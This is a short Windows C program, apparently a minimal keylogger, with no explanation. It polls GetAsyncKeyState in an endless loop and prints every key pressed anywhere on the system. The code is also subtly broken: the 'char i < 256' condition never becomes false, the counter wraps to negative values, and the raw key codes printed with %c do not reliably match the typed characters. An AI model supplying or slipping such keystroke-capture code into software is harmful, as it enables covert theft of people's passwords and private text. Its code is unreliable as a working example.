#include <Windows.h>
#include <stdio.h>

int main(){
    while(TRUE){
        for(char i = 0; i < 256; i++){
            if(GetAsyncKeyState(i) == -32767){
                printf("%c", i);
                Sleep(100);
            }
        }
    }
    return 0;
}